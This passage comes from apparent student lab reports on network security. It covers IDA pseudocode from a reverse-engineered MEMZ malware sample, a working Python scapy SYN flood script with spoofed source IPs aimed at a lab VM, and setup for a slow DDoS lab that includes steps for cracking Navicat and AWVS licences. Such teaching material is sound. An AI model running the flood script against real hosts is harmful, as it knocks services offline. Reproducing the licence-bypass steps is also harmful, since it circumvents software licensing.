class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>传入 v9，每创建一个 v9 就自增 2，v9 是 Double Word，每次自增是增加 8 个字节</p>
<p>1 Word&#x3D;2 Byte，Double Word &#x3D; 8 Byte&#x3D;4 Word</p>
<p>查看 v9 的地址如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">00405130</span> off_405130      dd offset sub_4014FC    ; DATA XREF: start+<span class="number">1F</span>1↑o</span><br><span class="line">.data:<span class="number">00405134</span>                 db  <span class="number">30</span>h ; <span class="number">0</span></span><br><span class="line">.data:<span class="number">00405135</span>                 db  <span class="number">75</span>h ; u</span><br><span class="line">.data:<span class="number">00405136</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00405137</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00405138</span>                 dd offset sub_40156D</span><br><span class="line">.data:<span class="number">0040513</span>C                 db  <span class="number">30</span>h ; <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040513</span>D                 db  <span class="number">75</span>h ; u</span><br><span class="line">.data:<span class="number">0040513</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040513F</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00405140</span>                 dd offset sub_4017A5</span><br><span class="line">.data:<span class="number">00405144</span>                 db  <span class="number">20</span>h</span><br><span class="line">.data:<span class="number">00405145</span>                 db  <span class="number">4</span>Eh ; N</span><br><span class="line">.data:<span class="number">00405146</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00405147</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00405148</span>                 dd offset sub_4016A0</span><br></pre></td></tr></table></figure></div>

<p>从初始地址 00405130 依次自增 2 个 DWORD（即 8 字节）分别变为 00405138、00405140、00405148、00405150、00405158、00405160、00405168、00405170、00405178，每个地址都对应了一个函数：sub_4014FC（初始）、sub_40156D、sub_4017A5、sub_4016A0、sub_4015D4、sub_40162A、sub_401866、sub_401688、sub_4017E9、sub_4016CD。这些函数就是导致电脑出现异常现象的元凶，这里需要逐个的分析每个函数，依次查看这些函数的伪代码</p>
<ol>
<li>sub_4014FC 函数</li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4014FC</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = sub_401A55();</span><br><span class="line">  ShellExecuteA(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, (&amp;lpFile)[v1 % <span class="number">0x2E</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = sub_401A55();</span><br><span class="line">  <span class="keyword">return</span> sub_401B09(</span><br><span class="line">           COERCE_UNSIGNED_INT64((<span class="type">double</span>)a1),</span><br><span class="line">           HIDWORD(COERCE_UNSIGNED_INT64((<span class="type">double</span>)a1)),</span><br><span class="line">           (<span class="type">double</span>)(v2 % <span class="number">200</span>) + <span class="number">1500.0</span> / ((<span class="type">double</span>)a1 / <span class="number">15.0</span> + <span class="number">1.0</span>) + <span class="number">100.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数使用 ShellExecuteA 随机打开一个文件&#x2F;网页。双击 lpFile 进入查看。如下所示，可以看到该函数随机打开的网页和文件有哪些。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">00405000</span> lpFile          dd offset aHttpGoogleCoCk</span><br><span class="line">.data:<span class="number">00405000</span>                                         ; DATA XREF: sub_4014FC+<span class="number">18</span>↑r</span><br><span class="line">.data:<span class="number">00405000</span>                                         ; <span class="string">&quot;http://google.co.ck/search?q=best+way+t&quot;</span>...</span><br><span class="line">.data:<span class="number">00405004</span>                 dd offset aHttpGoogleCoCk_0 ; <span class="string">&quot;http://google.co.ck/search?q=how+2+remo&quot;</span>...</span><br><span class="line">.data:<span class="number">00405008</span>                 dd offset aHttpGoogleCoCk_1 ; <span class="string">&quot;http://google.co.ck/search?q=mcafee+vs+&quot;</span>...</span><br><span class="line">.data:<span class="number">0040500</span>C                 dd offset aHttpGoogleCoCk_2 ; <span class="string">&quot;http://google.co.ck/search?q=how+to+sen&quot;</span>...</span><br><span class="line">.data:<span class="number">00405010</span>                 dd offset aHttpGoogleCoCk_3 ; <span class="string">&quot;http://google.co.ck/search?q=minecraft+&quot;</span>...</span><br><span class="line">.data:<span class="number">00405014</span>                 dd offset aHttpGoogleCoCk_4 ; <span class="string">&quot;http://google.co.ck/search?q=how+to+get&quot;</span>...</span><br><span class="line">.data:<span class="number">00405018</span>                 dd offset aHttpGoogleCoCk_5 ; <span class="string">&quot;http://google.co.ck/search?q=bonzi+budd&quot;</span>...</span><br><span class="line">.data:<span class="number">0040501</span>C                 dd offset aHttpGoogleCoCk_6 ; <span class="string">&quot;http://google.co.ck/search?q=how+2+buy+&quot;</span>...</span><br><span class="line">.data:<span class="number">00405020</span>                 dd offset aHttpGoogleCoCk_7 ; <span class="string">&quot;http://google.co.ck/search?q=how+to+cod&quot;</span>...</span><br><span class="line">.data:<span class="number">00405024</span>                 dd offset aHttpGoogleCoCk_8 ; <span class="string">&quot;http://google.co.ck/search?q=what+happe&quot;</span>...</span><br><span class="line">.data:<span class="number">00405028</span>                 dd offset aHttpGoogleCoCk_9 ; <span class="string">&quot;http://google.co.ck/search?q=g3t+r3kt&quot;</span></span><br><span class="line">.data:<span class="number">0040502</span>C                 dd offset aHttpGoogleCoCk_10 ; <span class="string">&quot;http://google.co.ck/search?q=batch+viru&quot;</span>...</span><br><span class="line">.data:<span class="number">00405030</span>                 dd offset aHttpGoogleCoCk_11 ; <span class="string">&quot;http://google.co.ck/search?q=virus.exe&quot;</span></span><br><span class="line">.data:<span class="number">00405034</span>                 dd offset aHttpGoogleCoCk_12 ; <span class="string">&quot;http://google.co.ck/search?q=internet+e&quot;</span>...</span><br><span class="line">.data:<span class="number">00405038</span>                 dd offset aHttpGoogleCoCk_13 ; <span class="string">&quot;http://google.co.ck/search?q=facebook+h&quot;</span>...</span><br><span class="line">.data:<span class="number">0040503</span>C                 dd offset aHttpGoogleCoCk_14 ; <span class="string">&quot;http://google.co.ck/search?q=virus+buil&quot;</span>...</span><br><span class="line">.data:<span class="number">00405040</span>                 dd offset aHttpGoogleCoCk_15 ; <span class="string">&quot;http://google.co.ck/search?q=how+to+cre&quot;</span>...</span><br><span class="line">.data:<span class="number">00405044</span>                 dd offset aHttpGoogleCoCk_16 ; <span class="string">&quot;http://google.co.ck/search?q=how+to+rem&quot;</span>...</span><br><span class="line">.data:<span class="number">00405048</span>                 dd offset aHttpGoogleCoCk_17 ; <span class="string">&quot;http://google.co.ck/search?q=my+compute&quot;</span>...</span><br><span class="line">.data:<span class="number">0040504</span>C                 dd offset aHttpGoogleCoCk_18 ; <span class="string">&quot;http://google.co.ck/search?q=dank+memz&quot;</span></span><br><span class="line">.data:<span class="number">00405050</span>                 dd offset aHttpGoogleCoCk_19 ; <span class="string">&quot;http://google.co.ck/search?q=how+to+dow&quot;</span>...</span><br><span class="line">.data:<span class="number">00405054</span>                 dd offset aHttpGoogleCoCk_20 ; <span class="string">&quot;http://google.co.ck/search?q=half+life+&quot;</span>...</span><br><span class="line">.data:<span class="number">00405058</span>                 dd offset aHttpGoogleCoCk_21 ; <span class="string">&quot;http://google.co.ck/search?q=is+illumin&quot;</span>...</span><br><span class="line">.data:<span class="number">0040505</span>C                 dd offset aHttpGoogleCoCk_22 ; <span class="string">&quot;http://google.co.ck/search?q=montage+pa&quot;</span>...</span><br><span class="line">.data:<span class="number">00405060</span>                 dd offset aHttpGoogleCoCk_23 ; <span class="string">&quot;http://google.co.ck/search?q=the+memz+a&quot;</span>...</span><br><span class="line">.data:<span class="number">00405064</span>                 dd offset aHttpGoogleCoCk_24 ; <span class="string">&quot;http://google.co.ck/search?q=stanky+dan&quot;</span>...</span><br><span class="line">.data:<span class="number">00405068</span>                 dd offset aHttpGoogleCoCk_25 ; <span class="string">&quot;http://google.co.ck/search?q=john+cena+&quot;</span>...</span><br><span class="line">.data:<span class="number">0040506</span>C                 dd offset aHttpGoogleCoCk_26 ; <span class="string">&quot;http://google.co.ck/search?q=vinesauce+&quot;</span>...</span><br><span class="line">.data:<span class="number">00405070</span>                 dd offset aHttpGoogleCoCk_27 ; <span class="string">&quot;http://google.co.ck/search?q=skrillex+s&quot;</span>...</span><br><span class="line">.data:<span class="number">00405074</span>                 dd offset aHttpAnswersMic ; <span class="string">&quot;http://answers.microsoft.com/en-us/prot&quot;</span>...</span><br><span class="line">.data:<span class="number">00405078</span>                 dd offset aHttpMotherboar ; <span class="string">&quot;http://motherboard.vice.com/read/watch-&quot;</span>...</span><br><span class="line">.data:<span class="number">0040507</span>C                 dd offset aHttpPlayClubpe ; <span class="string">&quot;http://play.clubpenguin.com&quot;</span></span><br><span class="line">.data:<span class="number">00405080</span>                 dd offset aHttpPcoptimize ; <span class="string">&quot;http://pcoptimizerpro.com&quot;</span></span><br><span class="line">.data:<span class="number">00405084</span>                 dd offset aHttpSoftonicCo ; <span class="string">&quot;http://softonic.com&quot;</span></span><br><span class="line">.data:<span class="number">00405088</span>                 dd offset aCalc         ; <span class="string">&quot;calc&quot;</span></span><br><span class="line">.data:<span class="number">0040508</span>C                 dd offset File          ; <span class="string">&quot;notepad&quot;</span></span><br><span class="line">.data:<span class="number">00405090</span>                 dd offset aCmd          ; <span class="string">&quot;cmd&quot;</span></span><br><span class="line">.data:<span class="number">00405094</span>                 dd offset aWrite        ; <span class="string">&quot;write&quot;</span></span><br><span class="line">.data:<span class="number">00405098</span>                 dd offset aRegedit      ; <span class="string">&quot;regedit&quot;</span></span><br><span class="line">.data:<span class="number">0040509</span>C                 dd offset aExplorer     ; <span class="string">&quot;explorer&quot;</span></span><br><span class="line">.data:<span class="number">004050</span>A0                 dd offset aTaskmgr      ; <span class="string">&quot;taskmgr&quot;</span></span><br><span class="line">.data:<span class="number">004050</span>A4                 dd offset aMsconfig     ; <span class="string">&quot;msconfig&quot;</span></span><br><span class="line">.data:<span class="number">004050</span>A8                 dd offset aMspaint      ; <span class="string">&quot;mspaint&quot;</span></span><br><span class="line">.data:<span class="number">004050</span>AC                 dd offset aDevmgmtMsc   ; <span class="string">&quot;devmgmt.msc&quot;</span></span><br><span class="line">.data:<span class="number">004050B</span>0                 dd offset aControl      ; <span class="string">&quot;control&quot;</span></span><br><span class="line">.data:<span class="number">004050B</span>4                 dd offset aMmc          ; <span class="string">&quot;mmc&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到，该函数打开的网页和文件有很多，而且是随机的。</p>
<ol start="2">
<li>sub_40156D 函数</li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_40156D</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-4h] [ebp-18h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagPOINT</span> <span class="title">Point</span>;</span> <span class="comment">// [esp+Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  GetCursorPos(&amp;Point);</span><br><span class="line">  v2 = a2 / <span class="number">2200</span> + <span class="number">2</span>;</span><br><span class="line">  v3 = sub_401A55() % v2;</span><br><span class="line">  v4 = sub_401A55() % v2;</span><br><span class="line">  v7 = Point.y + v3 * (sub_401A55() % <span class="number">3</span> - <span class="number">1</span>);</span><br><span class="line">  v5 = sub_401A55();</span><br><span class="line">  SetCursorPos(Point.x + v4 * (v5 % <span class="number">3</span> - <span class="number">1</span>), v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 GetCursorPos 获取当前屏幕的鼠标位置，然后在一定范围内随机取值，使用 SetCursorPos 设置新的鼠标位置，造成屏幕上鼠标抖动的现象。</p>
<p>剩下的就不一一列举了。</p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>网络安全</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>网络安全原理实验报告</tag>
        <tag>彩虹猫病毒逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验报告6——使用Python实现SYN Flood攻击实验</title>
    <url>/posts/8790bb83.html</url>
    <content><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li><p>操作系统：Windows 11 23H2</p>
</li>
<li><p>抓包工具：WireShark</p>
</li>
<li><p>虚拟化软件：VMware Workstation 16</p>
</li>
<li><p>虚拟机操作系统：Ubuntu 18.04.1</p>
</li>
</ul>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h3><p>使用 Python 编写的实现 SYN Flood 攻击的代码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randomIP</span>():</span><br><span class="line">    ip = <span class="string">&quot;.&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, (randint(<span class="number">0</span>, <span class="number">255</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>))))</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randInt</span>():</span><br><span class="line">    x = randint(<span class="number">1000</span>, <span class="number">9000</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SYN_Flood</span>(<span class="params">dstIP, dstPort, counter</span>):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在发送数据包……&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, counter):</span><br><span class="line">        s_port = randInt()</span><br><span class="line">        s_eq = randInt()</span><br><span class="line">        window = randInt()</span><br><span class="line"></span><br><span class="line">        IP_Packet = IP()</span><br><span class="line">        IP_Packet.src = randomIP()</span><br><span class="line">        IP_Packet.dst = dstIP</span><br><span class="line"></span><br><span class="line">        TCP_Packet = TCP()</span><br><span class="line">        TCP_Packet.sport = s_port</span><br><span class="line">        TCP_Packet.dport = dstPort</span><br><span class="line">        TCP_Packet.flags = <span class="string">&quot;S&quot;</span></span><br><span class="line">        TCP_Packet.seq = s_eq</span><br><span class="line">        TCP_Packet.window = window</span><br><span class="line"></span><br><span class="line">        send(IP_Packet / TCP_Packet, verbose=<span class="number">0</span>)</span><br><span class="line">        total += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n该线程发送的数据包个数：%i\n&quot;</span> % total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    dstIP, dstPort = <span class="string">&#x27;192.168.10.131&#x27;</span>, <span class="number">8000</span></span><br><span class="line"></span><br><span class="line">    num_threads = <span class="number">100</span></span><br><span class="line">    counter_per_thread = <span class="number">100000</span></span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        t = threading.Thread(target=SYN_Flood, args=(dstIP, dstPort, counter_per_thread))</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><ol>
<li><p>查看子网名称和子网地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image.png"
                      alt="子网名称和子网地址"
                ></p>
</li>
<li><p>进入 Ubuntu 虚拟机，打开终端</p>
</li>
<li><p>查看 IP 地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-1.png"
                      alt="IP地址"
                ></p>
</li>
<li><p>关闭 SYN Cookies 机制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-2.png"
                      alt="关闭SYN Cookies机制"
                ></p>
</li>
<li><p>开启一个简易的 Web 服务</p>
<pre><code>![开启一个简易的Web服务](../images/CyberSecurity/6-SYN-flood/image-3.png)
</code></pre>
</li>
<li><p>现在宿主主机就可以通过 IP 地址+端口号访问这个 Web 服务了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-4.png"
                      alt="访问Web服务"
                ></p>
</li>
</ol>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><ol>
<li><p>打开 Wireshark，选择网卡，开始抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-5.png"
                      alt="抓包"
                ></p>
</li>
<li><p>编辑攻击脚本，将目标 IP 地址和端口号改为宿主主机的 IP 地址和 Web 服务的端口号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-6.png"
                      alt="修改攻击脚本"
                ></p>
</li>
<li><p>运行攻击脚本，开始发送 SYN 包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-7.png"
                      alt="运行攻击脚本"
                ></p>
</li>
<li><p>访问 Web 服务，查看服务器的响应情况</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-8.png"
                      alt="访问Web服务"
                ></p>
</li>
<li><p>停止抓包，查看攻击结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/6-SYN-flood/image-9.png"
                      alt="停止抓包"
                ></p>
</li>
</ol>
<p>可以发现，Wireshark 捕捉到大量的 SYN 数据包，服务端由于大量的 SYN 请求，无法及时响应，导致连接超时。</p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>网络安全</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QFNU</tag>
        <tag>网络安全原理实验报告</tag>
        <tag>SYN Flood攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验报告7——慢 DDos 拒绝服务攻击</title>
    <url>/posts/dadf3090.html</url>
    <content><![CDATA[<h2 id="安装-Java-环境"><a href="#安装-Java-环境" class="headerlink" title="安装 Java 环境"></a>安装 Java 环境</h2><h3 id="下载-Java"><a href="#下载-Java" class="headerlink" title="下载 Java"></a>下载 Java</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image.png"
                      alt="Java 环境安装"
                ></p>
<p>验证 Java 环境是否安装成功：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-1.png"
                      alt="验证 Java 环境是否安装成功"
                ></p>
<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508103905919.png"
                      alt="image-20240508103905919"
                ></p>
<h2 id="安装-Tomcat"><a href="#安装-Tomcat" class="headerlink" title="安装 Tomcat"></a>安装 Tomcat</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508104037624.png"
                      alt="image-20240508104037624"
                ></p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508104128275.png"
                      alt="image-20240508104128275"
                ></p>
<h3 id="新建系统变量"><a href="#新建系统变量" class="headerlink" title="新建系统变量"></a>新建系统变量</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508104255153.png"
                      alt="image-20240508104255153"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508104456072.png"
                      alt="image-20240508104456072"
                ></p>
<h3 id="验证-javac"><a href="#验证-javac" class="headerlink" title="验证 javac"></a>验证 javac</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508104534407.png"
                      alt="image-20240508104534407"
                ></p>
<h3 id="启动-Tomcat"><a href="#启动-Tomcat" class="headerlink" title="启动 Tomcat"></a>启动 Tomcat</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508104615873.png"
                      alt="image-20240508104615873"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508104718611.png"
                      alt="image-20240508104718611"
                ></p>
<h2 id="靶机安装-MySQL"><a href="#靶机安装-MySQL" class="headerlink" title="靶机安装 MySQL"></a>靶机安装 MySQL</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508105818143.png"
                      alt="image-20240508105818143"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110009217.png"
                      alt="image-20240508110009217"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110313610.png"
                      alt="image-20240508110313610"
                ></p>
<h3 id="安装成功，启动数据库"><a href="#安装成功，启动数据库" class="headerlink" title="安装成功，启动数据库"></a>安装成功，启动数据库</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110446927.png"
                      alt="image-20240508110446927"
                ></p>
<h2 id="Navicat-安装、激活及连接"><a href="#Navicat-安装、激活及连接" class="headerlink" title="Navicat 安装、激活及连接"></a>Navicat 安装、激活及连接</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110831890.png"
                      alt="image-20240508110831890"
                ></p>
<h3 id="激活-Navicat"><a href="#激活-Navicat" class="headerlink" title="激活 Navicat"></a>激活 Navicat</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110857545.png"
                      alt="image-20240508110857545"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110909625.png"
                      alt="image-20240508110909625"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110930869.png"
                      alt="image-20240508110930869"
                ></p>
<h3 id="打开桌面的-Navicat，连接数据库，密码是-123456"><a href="#打开桌面的-Navicat，连接数据库，密码是-123456" class="headerlink" title="打开桌面的 Navicat，连接数据库，密码是 123456"></a>打开桌面的 Navicat，连接数据库，密码是 123456</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110948725.png"
                      alt="image-20240508110948725"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508110959411.png"
                      alt="image-20240508110959411"
                ></p>
<h3 id="确认连接"><a href="#确认连接" class="headerlink" title="确认连接"></a>确认连接</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508111104172.png"
                      alt="image-20240508111104172"
                ></p>
<h3 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508111140048.png"
                      alt="image-20240508111140048"
                ></p>
<h2 id="目录部署"><a href="#目录部署" class="headerlink" title="目录部署"></a>目录部署</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508111201146.png"
                      alt="image-20240508111201146"
                ></p>
<h2 id="运行-SQL-文件"><a href="#运行-SQL-文件" class="headerlink" title="运行 SQL 文件"></a>运行 SQL 文件</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508111216729.png"
                      alt="image-20240508111216729"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508111225935.png"
                      alt="image-20240508111225935"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508111232966.png"
                      alt="image-20240508111232966"
                ></p>
<h2 id="重启-Tomcat"><a href="#重启-Tomcat" class="headerlink" title="重启 Tomcat"></a>重启 Tomcat</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508111248463.png"
                      alt="image-20240508111248463"
                ></p>
<h2 id="下载安装-AWVS"><a href="#下载安装-AWVS" class="headerlink" title="下载安装 AWVS"></a>下载安装 AWVS</h2><h3 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112005567.png"
                      alt="image-20240508112005567"
                ></p>
<h3 id="运行激活软件"><a href="#运行激活软件" class="headerlink" title="运行激活软件"></a>运行激活软件</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112044706.png"
                      alt="image-20240508112044706"
                ></p>
<h3 id="AWVS-登录"><a href="#AWVS-登录" class="headerlink" title="AWVS 登录"></a>AWVS 登录</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112137328.png"
                      alt="image-20240508112137328"
                ></p>
<h3 id="进行许可证激活"><a href="#进行许可证激活" class="headerlink" title="进行许可证激活"></a>进行许可证激活</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112157227.png"
                      alt="image-20240508112157227"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112204042.png"
                      alt="image-20240508112204042"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112227315.png"
                      alt="image-20240508112227315"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112234640.png"
                      alt="image-20240508112234640"
                ></p>
<h3 id="输入命令"><a href="#输入命令" class="headerlink" title="输入命令"></a>输入命令</h3><p>以管理员身份运行 cmd，输入以下命令<br><code>cacls“C:\AWVS\shared\license\license_info.json” /t /p everyone:r</code><br><code>cacls “C:\ProgramData\Acunetix\shared\license\wa_data.dat” /t /p everyone:r</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112323960.png"
                      alt="image-20240508112323960"
                ></p>
<h3 id="成功登录"><a href="#成功登录" class="headerlink" title="成功登录"></a>成功登录</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112339707.png"
                      alt="image-20240508112339707"
                ></p>
